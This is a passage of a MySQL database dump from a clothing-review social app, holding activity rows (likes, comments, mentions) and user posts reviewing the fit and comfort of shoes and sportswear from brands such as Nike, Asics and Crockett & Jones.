(472, 10, 161, 82, 'comment', '', '\\ud83d\\ude04 #uniqlo would love to hear this story!', '2015-03-27 22:49:14', 1),
(473, 21, 58, 84, 'comment', '', 'very chic! ', '2015-03-27 23:49:05', 1),
(474, 21, 58, 84, 'like', '', '{"post_id":"84","user_id":"21"}', '2015-03-27 23:49:09', 1),
(475, 147, 10, 49, 'like', '', '{"post_id":"49","user_id":"147"}', '2015-03-28 04:27:36', 1),
(476, 10, 176, 91, 'like', '', '{"post_id":"91","user_id":"10"}', '2015-03-28 04:28:02', 1),
(477, 10, 176, 91, 'comment', '', 'fitting report?', '2015-03-28 04:28:24', 1),
(478, 147, 173, 77, 'like', '', '{"post_id":"77","user_id":"147"}', '2015-03-28 05:23:58', 0),
(479, 176, 10, 91, 'mention', '', '@herbertyang I tried submitting the post with fitting report but the app seemed to freeze', '2015-03-28 05:32:02', 1),
(480, 10, 176, 91, 'comment', '', '@cassandra sorry for that...probably due to connection speed...where are you?', '2015-03-28 05:52:20', 1),
(481, 10, 176, 91, 'mention', '', '@cassandra sorry for that...probably due to connection speed...where are you?', '2015-03-28 05:52:20', 1),
(482, 10, 147, 92, 'like', '', '{"post_id":"92","user_id":"10"}', '2015-03-28 05:52:35', 1),
(483, 10, 147, 92, 'comment', '', 'very devoted fan', '2015-03-28 05:52:59', 1),
(484, 10, 150, 94, 'like', '', '{"post_id":"94","user_id":"10"}', '2015-03-28 09:15:20', 1),
(485, 176, 10, 91, 'mention', '', '@herbertyang Might be... I''ll try again later ', '2015-03-28 13:29:14', 1),
(486, 10, 150, 94, 'comment', '', 'wow....this style is outstanding!', '2015-03-28 14:16:44', 1),
(487, 10, 172, 96, 'like', '', '{"post_id":"96","user_id":"10"}', '2015-03-28 14:16:57', 1),
(488, 10, 172, 97, 'like', '', '{"post_id":"97","user_id":"10"}', '2015-03-28 14:17:04', 1),
(489, 10, 62, 95, 'like', '', '{"post_id":"95","user_id":"10"}', '2015-03-28 14:17:18', 1),
(490, 21, 150, 94, 'like', '', '{"post_id":"94","user_id":"21"}', '2015-03-28 14:20:13', 1),
(491, 21, 150, 94, 'comment', '', 'what a team!', '2015-03-28 14:21:04', 1),
(492, 21, 150, 94, 'reshare', '', '{"post_id":"94","user_id":"21"}', '2015-03-28 14:22:21', 1),
(493, 21, 147, 92, 'like', '', '{"post_id":"92","user_id":"21"}', '2015-03-28 14:24:21', 1),
(494, 21, 147, 92, 'comment', '', 'I do the same (buying different colors of the same model) when finding something that really fits me! ', '2015-03-28 14:44:08', 1),
(495, 10, 21, 99, 'like', '', '{"post_id":"99","user_id":"10"}', '2015-03-28 15:17:42', 1),
(496, 21, 147, 75, 'comment', '', 'Nani - no fitting report? :-)', '2015-03-28 15:18:37', 1),
(497, 21, 150, 94, 'comment', '', 'let us know whether they are indeed that good after your run!', '2015-03-28 15:20:41', 1),
(498, 10, 172, 96, 'comment', '', 'it''s becoming my pastime routine to read your story before bedtime ', '2015-03-28 16:11:59', 1),
(499, 10, 172, 97, 'comment', '', 'let''s get a closer look at the sole?', '2015-03-28 16:14:20', 1),
(500, 172, 10, 96, 'comment_like', '', '{"comment_id":"248","user_id":"172"}', '2015-03-28 16:24:02', 1),
(501, 58, 10, 84, 'comment_like', '', '{"comment_id":"234","user_id":"58"}', '2015-03-28 17:43:23', 1),
(502, 58, 21, 84, 'comment_like', '', '{"comment_id":"237","user_id":"58"}', '2015-03-28 17:43:25', 1),
(503, 10, 62, 95, 'comment', '', 'stylish! did you but it from Japan?', '2015-03-28 17:50:49', 1),
(504, 10, 172, 100, 'comment', '', 'did you have to replace the original sole with rubber for London''s rainy day?', '2015-03-28 17:51:50', 1),
(505, 10, 150, 94, 'comment', '', 'wow your team has some style! you guys must turn a lot of heads when running together. this is quite s sight!', '2015-03-28 17:52:54', 1),
(506, 10, 150, 94, 'reshare', '', '{"post_id":"94","user_id":"10"}', '2015-03-28 17:52:58', 1),
(507, 10, 58, 102, 'comment', '', 'is this water running onto it?', '2015-03-28 17:53:35', 1),
(508, 10, 58, 102, 'like', '', '{"post_id":"102","user_id":"10"}', '2015-03-28 17:53:40', 1),
(509, 10, 21, 99, 'comment', '', 'you deck out perfectly...it''ll be hard to go unnoticed anywhere with this set ', '2015-03-28 17:54:43', 1),
(510, 10, 172, 97, 'comment', '', 'hilarious story...so...you and your boss wore the same shoes of probably the same size ...that''s quite a bonding moment', '2015-03-28 17:56:30', 1),
(511, 10, 147, 92, 'comment', '', '@wildsheepchase yeah, good deals come and go...must seize the moment', '2015-03-28 17:57:06', 1),
(512, 10, 21, 92, 'mention', '', '@wildsheepchase yeah, good deals come and go...must seize the moment', '2015-03-28 17:57:06', 1),
(513, 10, 21, 92, 'comment_like', '', '{"comment_id":"245","user_id":"10"}', '2015-03-28 17:57:10', 1),
(514, 10, 58, 84, 'comment', '', 'one more scarf, then all set', '2015-03-28 17:57:39', 1),
(515, 10, 181, 86, 'comment', '', 'try to use the fitting report function when posting so that this #lululemon can be logged into the database and become searchable/discoverable by others as well \\ud83d\\ude1d', '2015-03-28 18:00:36', 0),
(516, 10, 181, 86, 'like', '', '{"post_id":"86","user_id":"10"}', '2015-03-28 18:00:39', 0),
(517, 10, 181, 87, 'like', '', '{"post_id":"87","user_id":"10"}', '2015-03-28 18:00:51', 0),
(518, 10, 181, 87, 'comment', '', 'there are many #lululemon lovers here \\ud83d\\ude0b', '2015-03-28 18:01:16', 0),
(519, 10, 180, 88, 'like', '', '{"post_id":"88","user_id":"10"}', '2015-03-28 18:01:41', 0),
(520, 10, 180, 88, 'comment', '', 'you''ve got a very helpful photographer! \\ud83d\\ude1d', '2015-03-28 18:02:12', 0),
(521, 10, 180, 89, 'like', '', '{"post_id":"89","user_id":"10"}', '2015-03-28 18:02:27', 0),
(522, 10, 180, 90, 'like', '', '{"post_id":"90","user_id":"10"}', '2015-03-28 18:02:46', 0),
(523, 10, 180, 89, 'reshare', '', '{"post_id":"89","user_id":"10"}', '2015-03-28 18:03:04', 0),
(524, 10, 180, 89, 'comment', '', '@wildsheepchase @jacquelinewu look who''s here', '2015-03-28 20:15:32', 0),
(525, 10, 21, 89, 'mention', '', '@wildsheepchase @jacquelinewu look who''s here', '2015-03-28 20:15:32', 1),
(526, 10, 35, 89, 'mention', '', '@wildsheepchase @jacquelinewu look who''s here', '2015-03-28 20:15:32', 1),
(527, 10, 153, 103, 'like', '', '{"post_id":"103","user_id":"10"}', '2015-03-28 20:16:08', 1),
(528, 58, 10, 102, 'mention', '', '@herbertyang yes', '2015-03-28 20:43:54', 1),
(529, 10, 153, 103, 'comment', '', 'a nice shining glow it''s got...reminding me of iPhone 6''s gold', '2015-03-28 22:58:54', 1),
(530, 21, 180, 90, 'like', '', '{"post_id":"90","user_id":"21"}', '2015-03-29 00:47:05', 0),
(531, 21, 180, 90, 'comment', '', 'Hi welcome! Do these tights have to be hand washed? ', '2015-03-29 00:50:05', 0),
(532, 21, 180, 89, 'comment', '', 'I love the details at the back! \\ud83d\\udc4d', '2015-03-29 00:51:07', 0),
(533, 21, 180, 89, 'like', '', '{"post_id":"89","user_id":"21"}', '2015-03-29 00:51:15', 0),
(534, 21, 180, 88, 'like', '', '{"post_id":"88","user_id":"21"}', '2015-03-29 00:52:07', 0),
(535, 21, 58, 102, 'like', '', '{"post_id":"102","user_id":"21"}', '2015-03-29 00:53:30', 1),
(536, 21, 58, 102, 'comment', '', 'wow - very convincing cover photo! :-)', '2015-03-29 00:53:53', 1),
(537, 62, 10, 95, 'mention', '', '@herbertyang yes, bought at "jump ship" in Tokyo ', '2015-03-29 03:36:37', 1),
(538, 10, 62, 95, 'comment_like', '', '{"comment_id":"269","user_id":"10"}', '2015-03-29 03:56:09', 0),
(539, 10, 172, 96, 'comment', '', '@namiko Abe-san is trail blazing here...where is our stylish Naito-san?', '2015-03-29 03:57:49', 1),
(540, 10, 159, 96, 'mention', '', '@namiko Abe-san is trail blazing here...where is our stylish Naito-san?', '2015-03-29 03:57:49', 1),
(541, 153, 10, 105, 'comment', '', 'Herbert, time to go bespoke. The tailors will solve all your fitting problems!', '2015-03-29 07:11:53', 1),
(542, 10, 153, 105, 'mention', '', '@ryanyang no time no money Ryan \\ud83d\\ude1d', '2015-03-29 07:12:49', 1),
(543, 153, 10, 105, 'comment', '', 'you will be surprised that it only takes one fitting and there are very reasonable tailor shops around. just ask Vikram. ', '2015-03-29 07:13:58', 0),
(544, 10, 153, 106, 'like', '', '{"post_id":"106","user_id":"10"}', '2015-03-29 08:08:09', 1),
(545, 150, 21, 94, 'mention', '', '@wildsheepchase The shoes are perfect for trail running. It feels more powerful when you run up the hills, and prevent from slippery when you run down the hills. But it surely not the right one on road when we run through those villages, it almost killed my feet. ', '2015-03-29 08:20:43', 0),
(546, 35, 180, 89, 'comment', '', 'vivienne!!! ', '2015-03-29 08:55:57', 0),
(547, 147, 21, 75, 'mention', '', '@wildsheepchase I had a small misunderstanding about the fitting report before. The problem has solved right now.', '2015-03-29 13:56:53', 0),
(548, 58, 10, 104, 'comment', '', 'you comments make this shirt unforgettable :D', '2015-03-29 14:11:41', 0),
(549, 21, 147, 108, 'comment', '', 'Tres chic!', '2015-03-29 15:01:12', 1),
(550, 21, 147, 108, 'like', '', '{"post_id":"108","user_id":"21"}', '2015-03-29 15:02:51', 1);

-- --------------------------------------------------------

--
-- Table structure for table `posts`
--

CREATE TABLE IF NOT EXISTS `posts` (
`post_id` int(11) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `photo_url` varchar(100) DEFAULT '',
  `photo_width` int(4) NOT NULL,
  `photo_height` int(4) NOT NULL,
  `content` varchar(1024) DEFAULT '',
  `clothing_id` int(4) DEFAULT NULL,
  `has_fitting_report` tinyint(1) DEFAULT '0',
  `brand_name` varchar(50) DEFAULT '''''',
  `cloth_model` varchar(50) DEFAULT '',
  `sizing` varchar(50) DEFAULT '',
  `overall_rating` varchar(100) DEFAULT '',
  `is_recommended` tinyint(1) DEFAULT '0',
  `status` int(2) DEFAULT '0',
  `created` datetime DEFAULT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=109 ;

--
-- Dumping data for table `posts`
--

INSERT INTO `posts` (`post_id`, `user_id`, `photo_url`, `photo_width`, `photo_height`, `content`, `clothing_id`, `has_fitting_report`, `brand_name`, `cloth_model`, `sizing`, `overall_rating`, `is_recommended`, `status`, `created`) VALUES
(1, 10, 'https://s3.amazonaws.com/linkqlo/10/20150315022059/cover.jpg', 640, 640, 'Myeveryday #nike  jacket to get through the winter in Beijing/Shanghai, or the coldest nights in Palo Alto. Bought it in a Nike store in Sanlitun, Beijinga few years ago. It fits me all around in all dimensions and keepsgood bodytemperature, with enough room for another layer of fleece or sweater inside. Its got the right length just above the hip so it doesnt constrain leg movements at all.Its also fairly functional, with two side pockets, one inner pocket to the chest, and one pocket on the upper arm(easy to store access card for ski resort). Both its bottom opening and sleeve opening have strings to maintain good shapeand keep warm air inside. The black color makes it easy to pair up with pants/jeans of any color.I like it a lot.', 10, 1, 'Nike', 'winter jacket', 'L', '5', 1, 0, '2015-03-14 10:21:17'),
(2, 10, 'https://s3.amazonaws.com/linkqlo/10/20150315033959/cover.jpg', 640, 640, 'Very stylish #nike  #Flyknit sneakers, bought in a Nikestore near Omotesando, Tokyo in 2014. My foot size is 10.5 inchesandthis one (US 9, UK 8, EUR 42.5, CM 27) fits me very comfortably, with breathable room at toebox. This delicate pair is not for running but mostly for leisure/looking good. Its best to go with a pair of footie socksthat hide themselves inside the shoes- at least thats how every one in fashion mecca Omotesando Hills does it. Its got reasonably high heel collarwith a hook tip at the back, making it easy to pair with jeansandjogging pants. Straight pants and khakis will be a bit too square for its flamboyance.Its trendy look comes with maintenance cost - its a bit ofhassle to brush off dust from its solid white outsole regularly. Only one minor shortcoming - its shoelacesbecome loose easily. Overall it''s a great pair of sleek sneakers and I love it! Its current top of the linefrom Nike sneakers and sells out very quickly. Grab one when you see it on discount. ', 16, 1, 'Nike', 'flyknit', '9', '5', 1, 0, '2015-03-14 11:40:24'),
(3, 10, 'https://s3.amazonaws.com/linkqlo/10/20150315045504/cover.jpg', 640, 640, 'This is my kick-around-the-town pants. Size M fits me nicely.It doesnt look too loose to be too casual, and it doesnt look too tight to be uncomfortable for walking around. For someone with big thighs, this #underarmor pair of pants strikes a good balance and looks pretty nice.As casual pants for running around doing errants, its fairly convenient with two side pockets that can carry small accessaries (car keyetc). As sports pants, itsvery light, breathable with a inner layer, and good for outdoor running in cold weather. Its string-belt is well-designed. It wont retract into the pants, neither will it stick itself out inconveniently when you wear T-shirt/jacket on top of the pants. Its a good-looking versatile pair of pants at a reasonable price.', 4, 1, 'Under Armor', 'cross training pants', 'M', '4', 1, 0, '2015-03-14 12:55:14'),
(4, 10, 'https://s3.amazonaws.com/linkqlo/10/20150315185538/cover.jpg', 640, 640, 'Ive got a lot of milage out of this #thenorthface sweater. It holds up its shape very steady over the years, unlike many other sweaters that gradually lose theirstructures. Itgoes well with a heavy jacket as an insidelayer, andis also perfectly fine to be worn outside. Its roomy enough to hide imperfect boy lines without looking saggy.', 11, 1, 'The North Face', '', 'L/Regular', '4', 1, 0, '2015-03-15 02:55:46'),
(5, 21, 'https://s3.amazonaws.com/linkqlo/21/20150317204711/cover.jpg', 640, 640, '#nike got this pair at a great price from Nordstrom Rack. Extremely comfortable for walking and kicking around although I wouldn''t wear them for running or serious training. I like the bright color combinations. These shoes are true to size. ', 16, 1, 'Nike', 'Nike Air', '7', '4', 1, 0, '2015-03-17 04:47:17'),
(6, 21, 'https://s3.amazonaws.com/linkqlo/21/20150319041718/cover.jpg', 640, 640, '#nike This piece exemplifies Nike''s great design capacity. The stiff price tag delayed my purchase decision for a while, but once I got this special "Gaykusou" edition on sale (still pricey though) and ran in it, it became clear that the vest is worth every penny. The down vest is super thin yet extremely warm. It''s perfect for winter running. I wear it with Nike Hyperwarm tops and they are just nice for the 5 Celsius degree winter in Shanghai (feels like 0 Celcius due to the humidity). This vest can also be folded into a small bag that you can easily hold in a hand when it''s getting too warm. A super good-looking and functional piece from Nike! Loving it... ', 12, 1, 'Nike', 'Aeroloft 800 Running Vest Gyakusou ', 'S/4', '5', 1, 0, '2015-03-18 12:17:53'),
(8, 150, 'https://s3.amazonaws.com/linkqlo/150/20150321070641/cover.jpg', 638, 568, '#nike Bought it with my daughter. She got blue one and mine is red. Light and comfortable. Perfect for road running!', 16, 1, 'Nike', '', '7.5', '3', 1, 0, '2015-03-20 15:09:00'),
(9, 149, 'https://s3.amazonaws.com/linkqlo/149/20150322010128/cover.jpg', 640, 636, '#nike bought in Japan. It''s furry on the inside so it''s very efficient in keeping warmth. Even though it''s from Nike it''s not exactly athletic shoes. It''s quite comfortable and very nice looking.\n', 16, 1, 'Nike', '', '7', '4', 1, 0, '2015-03-21 07:01:48'),
(10, 21, 'https://s3.amazonaws.com/linkqlo/21/20150322013223/cover.jpg', 640, 640, 'This #nike hyperwarm top with folding collar is one of my favorite recent purchases. It''s form-fitting, warm and comfortable. Very good for fall/winter running. ', 12, 1, 'Nike', 'Nike Hyperwarm', 'S/4', '5', 1, 0, '2015-03-21 09:32:29'),
(11, 21, 'https://s3.amazonaws.com/linkqlo/21/20150322014419/cover.jpg', 640, 640, 'Well, fluorescent/bright-print tights are simply not for us with big thighs (and calves). As much as I trust the quality of Nike products (they are usually very comfortable, easy to care and extremely durable), all those prints simply don''t flatter our legs. Stick to black! The left two pictures are Nike legendary tights with some attractive prints. But they stop looking attractive once I put them on. The right picture is me in black skinny jeans - which is plain but makes my legs look a tiny bit thinner. So unfortunately, I''ll have to leave those beautiful prints for girls with long and thin legs. ', 7, 1, 'Nike', 'legendary tights', 'S/4', '3', 0, 0, '2015-03-21 09:44:23'),
(13, 147, 'https://s3.amazonaws.com/linkqlo/147/20150322165123/cover.jpg', 640, 640, 'They are not the best shoes for running. However they are absolutely perfect shoes for casual fashion. Comfortable, stylish and quite easy to fit all kinds of sports wear. A little bit narrow than usual size. \n', 16, 1, 'Asics', '', '7', '4', 1, 0, '2015-03-22 00:51:55'),
(15, 32, 'https://s3.amazonaws.com/linkqlo/32/20150321141511/cover.jpg', 640, 640, 'Bought from Aritzia which is my new favorite brand. It''s a very lightweight down jacket which is made with a water-repellent fabric. I live in a very rainy place. It comes with a storage bag. I can easily put the jacket in my bag. I like it. ', 10, 0, '', '', '', '3', 1, 0, '2015-03-22 04:15:15'),
(16, 35, 'https://s3.amazonaws.com/linkqlo/35/20150323054030/cover.jpg', 640, 640, 'Love this pair of Nike with hidden heel!!  ', 16, 1, 'Nike', '', '7', '5', 1, 0, '2015-03-22 13:41:03'),
(17, 59, 'https://s3.amazonaws.com/linkqlo/59/20150322054149/cover.jpg', 638, 640, '#nike dri fit knit#, as its style reads, fits well but not too snugly and dries fast when you sweat, making it perfect for running in the summer.  I also like it''s seamless texture and pure sky-blue color.', 8, 1, 'Nike', 'dri fit knit', 'XS/0', '5', 1, 0, '2015-03-22 15:41:51'),
(18, 49, 'https://s3.amazonaws.com/linkqlo/49/20150322084651/cover.jpg', 639, 640, '@Nike I play basketball twice a week so I do care about what I wear a lot. Own this nike air shoe for more than 9 months and I am totally in love with it. Very stylish and very light thanks for its unique lightweight design. It helps me to do better pivot, shuffle and cut through on the court! Highly recommend if you are in market for a better basket shoe.', 16, 1, 'Nike', 'Nike air max stutter step', '10', '5', 1, 0, '2015-03-22 16:46:54'),
(19, 59, 'https://s3.amazonaws.com/linkqlo/59/20150322065032/cover.jpg', 638, 640, 'There is good reason why #the North Face# is so popular in the Windy City: it''s insulated and wind-proof, yet light and stylish.  Mine is also rain-proof, so with a mid-layer, I can wear it for skiing.  The sleeves are too long for me, though.  I wish it can come in petite sizes.', 10, 1, 'The North Face', '', 'XS/2', '4', 1, 0, '2015-03-22 16:50:39'),
(21, 146, 'https://s3.amazonaws.com/linkqlo/146/20150322031914/cover.jpg', 639, 640, 'I bought this pair of #Mizuno wave inspire sneakers from a local Palo Alto store. My foot is wider than average but the shoes fit me perfectly with a size of 10 (I normally wear 9.5). ', 16, 1, 'mizuno', 'wave inspire ', '10', '5', 1, 0, '2015-03-22 17:19:15'),
(22, 59, 'https://s3.amazonaws.com/linkqlo/59/20150322073950/cover.jpg', 638, 638, 'I have under-pronated feet, so I need to choose running shoes that offers flexibility and moderate cushioning.  After some research, I found #asics gel-nimbus#, which is recommended for normal and slightly under-pronated runners.  I''ve been wearing it for about half a year.  So far, pretty happy with it.  The outside edge of the bottom does not wear down as fast as my regular commute shoes, which is a good sign.', 16, 1, 'Asics', 'Gel-Nimbus 15', '6', '5', 1, 0, '2015-03-22 17:39:56'),
(23, 154, 'https://s3.amazonaws.com/linkqlo/154/20150322043406/cover.jpg', 640, 424, '#thenorthface fleece half zip pullover with chest pocket. Purchased from REI in Fall 2014.  Is a lightweight fleece with quick dry treatment.  Best for temps ~50s / 60s F.   Built with multiple seams for exact fit.  Sleeves are long for the cut.  Waist is on top of hips.  Good for layering under an outer shell.', 11, 1, 'The North Face', '', 'S/Trim', '3', 0, 0, '2015-03-22 18:34:07'),
(24, 154, 'https://s3.amazonaws.com/linkqlo/154/20150322044225/cover.jpg', 640, 424, '#nike element half zip running top.  Anthracite/heather/black.  Made of Dri-Fit stretch spandex material.  Thumb holes in sleeves.  Comfortable for running on cool days.', 11, 1, 'Nike', '504606-064', 'S/Regular', '4', 1, 0, '2015-03-22 18:42:27'),
(25, 154, 'https://s3.amazonaws.com/linkqlo/154/20150322044945/cover.jpg', 640, 424, '#lululemon Metal Tech Short Sleeve.  Seam free construction makes it a good match for running and gym.  The Silverescent feature is good also.  Have owned this in S and M and prefer the length of the S.  An excellent workout shirt.', 8, 1, 'Lululemon', '', 'S/Regular', '5', 1, 0, '2015-03-22 18:49:46'),
(26, 154, 'https://s3.amazonaws.com/linkqlo/154/20150322051005/cover.jpg', 640, 424, '#lululemon mens pace breaker short.  Stretch fabric with liner and mesh panels.  Two front side pockets and a zip pocket for keys.  very good all purpose work out short (gym, running etc)', 4, 1, 'Lululemon', '', 'S', '5', 1, 0, '2015-03-22 19:10:08'),
(27, 154, 'https://s3.amazonaws.com/linkqlo/154/20150322051515/cover.jpg', 640, 424, '#adidas mens barricade V tennis shoe.  Bought these 5 yrs ago and is very good shoe for any court sport. solidly built and nice lateral support.  Excellent fit.', 16, 1, 'Adidas', '919462', '8.5', '5', 1, 0, '2015-03-22 19:15:17'),
(29, 49, 'https://s3.amazonaws.com/linkqlo/49/20150322113752/cover.jpg', 640, 640, '@newbalance very light tank top shirt. Great for outdoor basketball game! ', 4, 1, 'New Balance', '', 'M', '5', 1, 0, '2015-03-22 19:37:54'),
(30, 59, 'https://s3.amazonaws.com/linkqlo/59/20150322115534/cover.jpg', 638, 640, 'Bought it at an #asics# outlet store because of its ribbon print.  It fitted well when I tried it at the store, but loosed up after a few washes.', 8, 1, 'Asics', '', 'XS/0', '4', 1, 0, '2015-03-22 21:55:39'),
(31, 160, 'https://s3.amazonaws.com/linkqlo/160/20150322094412/cover.jpg', 640, 640, 'These are 6B, little wider than average size 6s. Soft top leather. Very comfortable.', 16, 1, 'Cole Haan', '', '6', '4', 1, 0, '2015-03-22 23:44:14'),
(32, 160, 'https://s3.amazonaws.com/linkqlo/160/20150322101049/cover.jpg', 640, 640, 'Super warm and comfy! Theory alway fits perfectly. Size: P/TP.', 6, 1, 'Theory', '', '', '5', 1, 0, '2015-03-23 00:10:53'),
(33, 146, 'https://s3.amazonaws.com/linkqlo/146/20150322102245/cover.jpg', 640, 611, 'My wife found this gem for me. Comfortable, stylish and fits me well. ', 8, 1, 'Zobha', '', 'L', '5', 1, 0, '2015-03-23 00:22:49'),
(34, 147, 'https://s3.amazonaws.com/linkqlo/147/20150323172140/cover.jpg', 640, 481, 'Bought from Portland city where the NIKEs headquarters is based in. Im a big fun of NIKE. So a very important thing on the must to do list in Portland was to buy a pair of NIKE shoes. I really love the color combinations, cause theyre so easy to match outfits from sportswear to dress. And theyre extremely light,breathable and comfortable as well. Love them', 16, 1, 'Nike', '', '6.5', '5', 1, 0, '2015-03-23 01:22:23'),
(35, 145, 'https://s3.amazonaws.com/linkqlo/145/20150323191201/cover.jpg', 638, 638, 'Great spring jacket for both casual and sports dress. Stretchable, elastic, warm and comfy, especially good for early springs while it is cold but not chilly. Nice fit with either a t-shirt or sweater inside. Bought in Livermore California.', 10, 0, '', '', '', '3', 1, 0, '2015-03-23 03:12:41'),
(36, 33, 'https://s3.amazonaws.com/linkqlo/33/20150324022115/cover.jpg', 638, 636, 'Nice fit and smooth, won''t burn skin when sweating ', 8, 0, '', '', '', '3', 1, 0, '2015-03-23 10:21:33'),
(37, 153, 'https://s3.amazonaws.com/linkqlo/153/20150323044748/cover.jpg', 640, 640, 'Crockett & Jones Chelsea boots (model# Chelsea5). Crockett & Jones has been making handmade shoes in traditional Goodyear construction since 1879 in Northampton, England. These boots are classic Chelsea design. Very similar to the ones worn by the Beatles when they invaded America in the early 60''s. I have owned this pair for 4 years. Goodyear construction ensures very rigid build quality. I wear them in the rain and snow, no problem. Problem is with size. This one fits me perfectly in 8E(European) but I have others that fits in size 8 1/2E or even 9E. So buying these online would probably result in returns. Try them on in stores is highly recommended. Speaking of store, there is only one on 6th Ave in NYC and they only order through paper catalog. Barneys carries limited styles you can buy online or in store. ', 16, 1, 'Crockett & Jones', 'Chelsea 5', '8', '3', 1, 0, '2015-03-23 18:47:51'),
(38, 153, 'https://s3.amazonaws.com/linkqlo/153/20150323050256/cover.jpg', 640, 640, 'Crockett & Jones chukka boots (model# Chiltern) in brown suede. As with all other C&J shoes, these are Goodyear constructed classic British shoes. They weigh much more than equivalent Italian shoes in Blake construction. This one has leather sole, C&J will charge you to put on rubber sole if you fancy. This one is in 8 1/2E size. As size inconsistency mentioned in other Crockett & Jones review, this one also fits me perfectly but is half a size larger than the perfectly fitting size 8E Chelsea 5 boots. Again, recommend you try them on personally to avoid unnecessary returns. ', 16, 1, 'Crockett & Jones', 'Chiltern (chukka boots)', '8.5', '3', 1, 0, '2015-03-23 19:02:57'),
(39, 153, 'https://s3.amazonaws.com/linkqlo/153/20150323051428/cover.jpg', 640, 640, 'Back with another Crockett & Jones review. This one is is what C&J calls "whole cut". It means the upper of the shoe is cut from a single piece of leather, as you can see from the picture, there are no stitchings. The model is called Alex in black calf leather. Size is 9E. Now you see that I have C&J shoes ranging from 8 to 8-1/2 and 9 all in European size and they all fit me perfectly. This shoe has leather sole, not sure if you can get C&J to put on rubber sole or not. It is very comfortable to walk around all day in, but not sure if you can actually comfortably run around chasing bad guys in them like James Bond. ', 16, 1, 'Crockett & Jones', 'Alex', '9', '3', 1, 0, '2015-03-23 19:14:29'),
(40, 153, 'https://s3.amazonaws.com/linkqlo/153/20150323062313/cover.jpg', 640, 640, 'These Crockett & Jones are from Barneys in L.A.  They are made for Barneys so the brown suede color isn''t available in C&J''s own catalog. They are size 8-1/2D, not sure what D stands for but salesman says it is European 8-1/2. Fit is snug. Shoe has rubber sole. They are model Chelsea5', 16, 1, 'Crockett & Jones', 'Chelsea 5', '8.5', '3', 1, 0, '2015-03-23 20:23:17'),
(41, 153, 'https://s3.amazonaws.com/linkqlo/153/20150323063338/cover.jpg', 640, 640, 'Battistoni chukka boots in navy suede.  Battistoni is a fashion brand started out in Rome as a shirt maker so my guess is that they only design the shoes and farm out the production, unlike Crockett & Jones, which is a traditional shoemaker. From the lighter weight of the shoe and its Italian origin, one may guess that this is a Blake constructed shoe, there''s really nothing run with that as most Italian and Scandinavian shoes are Blake. I only bought this because the navy suede is absolutely beautiful and not available from C&J. The size is 8 and the fit is slightly loose. ', 16, 1, 'Battistoni', 'chukka', '8', '3', 1, 0, '2015-03-23 20:33:39'),
(42, 153, 'https://s3.amazonaws.com/linkqlo/153/20150323064105/cover.jpg', 640, 640, 'These are simple casual suede shoes from Brunello Cucinelli. I got them in China so not sure if they are for sale in the States. Size 42(Chinese?) and loose fit. The sole is a very light composite material and very easy to walk in them. ', 16, 1, 'Brunello Cucinelli', '', '8', '3', 1, 0, '2015-03-23 20:41:07'),
(44, 142, 'https://s3.amazonaws.com/linkqlo/142/20150324152702/cover.jpg', 320, 320, 'nice swimming shorts from #speedo.  the only swimming costume I own that my wife does no frown upon.', 4, 0, '', '', '', '3', 1, 0, '2015-03-23 23:26:50'),
(45, 147, 'https://s3.amazonaws.com/linkqlo/147/20150325005850/cover.jpg', 640, 640, 'NIKE ZOOMFLY 2 FOR RUNNING.Shoes great so far, they do seem a little more supportive for distance runs. Colors are just as pictured, sizing accurate to any other running shoe I have worn.I always choose bright color for running or training shoes. They make me feel energetic.', 16, 1, 'Nike', '', '7', '5', 1, 0, '2015-03-24 08:58:53'),
(46, 35, 'https://s3.amazonaws.com/linkqlo/35/20150325034244/cover.jpg', 639, 640, 'The reason I like this #BCBG evening gang is 1) the shiny black color 2) special design at shoulder to cover thicker arms and 3) the right chest design to shape you up JUST right!!  ', 6, 1, 'GapFit', '', 'XS/0', '5', 1, 0, '2015-03-24 11:43:02'),
(47, 58, 'https://s3.amazonaws.com/linkqlo/58/20150324181456/cover.jpg', 640, 640, 'Was a present but it fits well for outdoors. Comfortable and versatile ', 8, 1, 'Hollister', '', 'XS/0', '4', 1, 0, '2015-03-25 02:14:57'),
(48, 150, 'https://s3.amazonaws.com/linkqlo/150/20150325192826/cover.jpg', 638, 640, 'Bought this pretty Puma shoes in Singapore last year.  It became to be my favorite shoes during the whole winter.  Although it is a little bit harder but still comfortable. ', 16, 1, 'Puma', '', '7.5', '4', 1, 0, '2015-03-25 03:28:31'),
(49, 10, 'https://s3.amazonaws.com/linkqlo/10/20150324140719/cover.jpg', 640, 640, 'I have a number of such #nike running #dri-fit T-shirts, in a variety of materials and colors. Just can''t get enough of them. They look sleek, very breathable, very light, while also keeping enough body temperature when I run on cold night outdoors. This piece fits me perfectly. I like the low-rise collar and the chest zip, sort of minimalistic design. The dri-fit fabric is very comfortable with body skin when doing exercise. ', 8, 1, 'Nike', 'Nike Running Dri-Fit', 'L/Regular', '4', 1, 0, '2015-03-25 04:07:22'),
(50, 157, 'https://s3.amazonaws.com/linkqlo/157/20150325201115/cover.jpg', 640, 640, 'Asics gel-kayano 21 running shoes, prefect for running beginners, good support on Kees and very easy to wear, match with almost anything. A trendy fashion match with casual wear as well. ', 16, 1, 'Asics', 'Gel-Kayano 21', '5.5', '4', 1, 0, '2015-03-25 04:11:28'),
(51, 156, 'https://s3.amazonaws.com/linkqlo/156/20150324145727/cover.jpg', 640, 640, '#cole haan leather shoes. good for casual and work. My feet are wide. they are trying to make the shoes so portable that they were a bit tight for me. changed insoles to thinner ones and problem solvednow i wear them every time i travel for work', 16, 1, 'cole haan', '', '8.5', '5', 1, 0, '2015-03-25 04:57:30'),
(52, 148, 'https://s3.amazonaws.com/linkqlo/148/20150325081230/cover.jpg', 640, 640, 'Asics Gel Kayano 16', 16, 1, 'Asics', '', '', '3', 1, 0, '2015-03-25 06:12:33'),
(53, 148, 'https://s3.amazonaws.com/linkqlo/148/20150325083800/cover.jpg', 640, 640, 'Day-to-day shoes by Lloyds. Very light and comfortable, but wear out quickly.', 16, 1, 'Lloyds', '', '', '3', 1, 0, '2015-03-25 06:38:11'),
(54, 148, 'https://s3.amazonaws.com/linkqlo/148/20150325084206/cover.jpg', 640, 640, 'Light all purpose coat', 10, 1, 'Massimo Dutti', '', '', '5', 1, 0, '2015-03-25 06:42:09'),
(55, 148, 'https://s3.amazonaws.com/linkqlo/148/20150325084419/cover.jpg', 640, 640, 'A useful tie', 13, 1, 'Austin Reed', '', '', '3', 1, 0, '2015-03-25 06:44:24'),
